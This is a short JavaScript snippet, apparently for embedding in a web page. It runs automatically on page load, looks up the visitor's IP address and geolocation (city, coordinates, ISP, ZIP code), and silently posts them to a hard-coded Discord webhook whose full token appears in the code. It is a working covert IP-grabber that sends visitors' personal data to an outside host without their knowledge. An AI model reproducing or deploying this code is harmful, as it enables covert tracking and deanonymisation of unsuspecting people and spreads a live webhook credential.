function sendIPToWebhook() {
    const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            fetch(`https://ipapi.co/${ipAddress}/json/`)
                .then(response => response.json())
                .then(geoData => {
                    const embedData = {
                        "title": "User's Geolocation Information",
                        "color": 16776960, // Yellow color (decimal representation)
                        "fields": [
                            {
                                "name": "IP Address",
                                "value": geoData.ip,
                                "inline": true
                            },
                            {
                                "name": "Country",
                                "value": geoData.country_name,
                                "inline": true
                            },
                            {
                                "name": "Region",
                                "value": geoData.region,
                                "inline": true
                            },
                            {
                                "name": "City",
                                "value": geoData.city,
                                "inline": true
                            },
                            {
                                "name": "Latitude",
                                "value": geoData.latitude,
                                "inline": true
                            },
                            {
                                "name": "Longitude",
                                "value": geoData.longitude,
                                "inline": true
                            },
                            {
                                "name": "ISP",
                                "value": geoData.org,
                                "inline": false
                            },
                            {
                                "name": "Organization",
                                "value": geoData.asn,
                                "inline": false
                            },
                            {
                                "name": "ZIP Code",
                                "value": geoData.postal,
                                "inline": true
                            }
                        ]
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            embeds: [embedData]
                        }),
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log("Geolocation embed sent successfully!");
                        } else {
                            console.error("Failed to send geolocation embed.");
                        }
                    })
                    .catch(error => console.error(error));
                })
                .catch(error => console.error(error));
        })
        .catch(error => console.error(error));
}

// Automatically send the webhook on page load
sendIPToWebhook();
